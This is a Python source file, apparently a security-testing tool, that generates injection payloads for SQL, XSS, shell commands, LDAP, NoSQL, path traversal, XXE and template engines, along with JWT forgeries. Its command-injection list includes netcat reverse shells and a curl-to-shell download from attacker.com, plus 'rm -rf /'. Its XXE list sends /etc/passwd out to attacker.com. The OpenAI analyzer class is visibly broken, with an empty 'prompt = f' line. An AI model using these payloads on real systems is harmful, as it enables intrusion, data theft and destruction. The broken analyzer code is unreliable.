import json
import logging
import random
import string
import time
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional, Union
import hashlib
import base64

class SecurityPayloadGenerator:

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def generate_sql_injection_payloads(self) -> List[str]:
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "' UNION SELECT 1,2,3--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' or '1' = '1",
            "1' or '1' = '1' --",
            "1' or '1' = '1' #",
            "1' or '1' = '1'/*",
            "' OR 'x'='x",
            "' AND id IS NULL; --",
            "' UNION SELECT null, username, password FROM users--"
        ]

    def generate_xss_payloads(self) -> List[str]:
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script src=//xss.rocks/xss.js></script>",
            "<script>alert(/XSS/)</script>"
        ]

    def generate_command_injection_payloads(self) -> List[str]:
        return [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; cat /etc/shadow",
            "| id",
            "&& id",
            "; id",
            "| ls -la /",
            "&& ls -la /",
            "; ls -la /",
            "$(whoami)",
            "`whoami`",
            "${IFS}cat${IFS}/etc/passwd",
            ";nc -e /bin/sh attacker.com 4444",
            "|nc -e /bin/sh attacker.com 4444",
            "&&nc -e /bin/sh attacker.com 4444",
            "; rm -rf /",
            "| rm -rf /",
            "&& rm -rf /",
            "; curl http://attacker.com/shell.sh | sh"
        ]

    def generate_ldap_injection_payloads(self) -> List[str]:
        return [
            "*",
            "*)(&",
            "*))%00",
            "*()|%26'",
            "*()|&'",
            "*(|(mail=*))",
            "*(|(objectclass=*))",
            "*)(uid=*))(|(uid=*",
            "*)(|(cn=*))",
            "*)(|(sn=*))",
            "admin)(&(password=*))",
            "admin))(|(|",
            "*)(uid=*))((|uid=*",
            "*)(|(uid=*)(uid=*",
            "*)((|uid=*",
            "*)(|(uid=*)(|(uid=*"
        ]

    def generate_nosql_injection_payloads(self) -> List[Dict[str, Any]]:
        return [
            {"$ne": None},
            {"$ne": ""},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$exists": True},
            {"$where": "1==1"},
            {"$or": [{"password": {"$ne": None}}, {"password": {"$exists": True}}]},
            {"$and": [{"username": {"$ne": None}}, {"password": {"$ne": None}}]},
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"$where": "this.username == this.password"},
            {"$expr": {"$eq": ["$username", "$password"]}},
            {"username": {"$regex": "^admin"}, "password": {"$ne": None}},
            {"$or": [{"username": "admin"}, {"username": {"$regex": "admin"}}]},
            {"username": {"$in": ["admin", "administrator", "root"]}},
            {"password": {"$regex": "^.{0,10}$"}},
            {"$where": "Object.keys(this)[0].match('^.{0,10}$')"}
        ]

    def generate_path_traversal_payloads(self) -> List[str]:
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/var/www/../../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "..///////..////..//////etc/passwd",
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
            "/..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd",
            "\\..\\..\\..\\etc\\passwd"
        ]

    def generate_xxe_payloads(self) -> List[str]:
        return [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "expect://id">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfiltrate;]><data></data>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>',
            '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd"><data>test</data>'
        ]

    def generate_ssti_payloads(self) -> List[str]:
        return [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.__class__}}",
            "{{request.application}}",
            "{{g}}",
            "{{self}}",
            "{{lipsum.__globals__}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{joiner.__init__.__globals__.os.popen('id').read()}}",
            "{{namespace.__init__.__globals__.os.popen('id').read()}}",
            "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}",
            "#{T(java.lang.Runtime).getRuntime().exec('calc')}",
            "{{''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()}}"
        ]

    def generate_jwt_manipulation_payloads(self, original_token: str) -> List[str]:
        payloads = []
        try:
            parts = original_token.split('.')
            if len(parts) != 3:
                return payloads
            header, payload, signature = parts
            import base64
            import json
            def decode_jwt_part(part):
                padding = 4 - len(part) % 4
                if padding != 4:
                    part += '=' * padding
                return json.loads(base64.urlsafe_b64decode(part))
            def encode_jwt_part(data):
                return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
            header_data = decode_jwt_part(header)
            payload_data = decode_jwt_part(payload)
            header_none = header_data.copy()
            header_none['alg'] = 'none'
            payloads.append(f"{encode_jwt_part(header_none)}.{payload}.")
            payloads.append(f"{header}.{payload}.")
            modified_payload = payload_data.copy()
            if 'roles' in modified_payload:
                modified_payload['roles'] = ['admin', 'superuser']
            if 'isAdmin' in modified_payload:
                modified_payload['isAdmin'] = True
            if 'userId' in modified_payload:
                modified_payload['userId'] = '1'
            payloads.append(f"{header}.{encode_jwt_part(modified_payload)}.")
            header_rs256 = header_data.copy()
            header_rs256['alg'] = 'RS256'
            payloads.append(f"{encode_jwt_part(header_rs256)}.{payload}.{signature}")
            modified_payload_exp = payload_data.copy()
            modified_payload_exp['exp'] = int(time.time()) + 3600
            payloads.append(f"{header}.{encode_jwt_part(modified_payload_exp)}.{signature}")
        except Exception as e:
            self.logger.debug(f"JWT manipulation failed: {str(e)}")
        return payloads

    def generate_random_string(self, length: int = 10) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_boundary_values(self, field_type: str) -> List[Any]:
        boundaries = {
            "integer": [-1, 0, 1, 2147483647, -2147483648, 999999999999999999],
            "string": ["", "a", "A" * 1000, "A" * 10000, self.generate_random_string(255)],
            "email": ["", "invalid", "@", "test@", "@test.com", "test@test", "a" * 100 + "@test.com"],
            "phone": ["", "123", "+1234567890123456789", "abc", "123-456-7890"],
            "url": ["", "invalid", "http://", "ftp://test.com", "javascript:alert(1)", "http://" + "a" * 1000 + ".com"],
            "date": ["", "2000-01-01", "1900-01-01", "2100-12-31", "invalid-date"],
        }
        return boundaries.get(field_type, [])

class AISecurityAnalyzer:

    def __init__(self, api_key: Optional[str] = None):
        self.api_key = api_key
        self.logger = logging.getLogger(__name__)
        if api_key:
            try:
                import openai
                self.client = openai.OpenAI(api_key=api_key)
            except ImportError:
                self.logger.warning("OpenAI library not installed")
                self.client = None
        else:
            self.client = None

    def analyze_api_response(self, response_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        if not self.client:
            return []
        try:
            prompt = f
            response = self.client.chat.completions.create(
                model="gpt-4",
                messages=[{"role": "user", "content": prompt}],
                max_tokens=1000,
                temperature=0.3
            )
            ai_analysis = response.choices[0].message.content
            return self._parse_ai_findings(ai_analysis)
        except Exception as e:
            self.logger.error(f"AI analysis failed: {str(e)}")
            return []

    def _parse_ai_findings(self, ai_response: str) -> List[Dict[str, Any]]:
        try:
            import re
            json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
            if json_match:
                findings = json.loads(json_match.group())
                if isinstance(findings, dict):
                    return [findings]
                elif isinstance(findings, list):
                    return findings
        except:
            pass
        return [{
            'type': 'AI Analysis',
            'severity': 'INFO',
            'description': ai_response[:500] + '...' if len(ai_response) > 500 else ai_response
        }]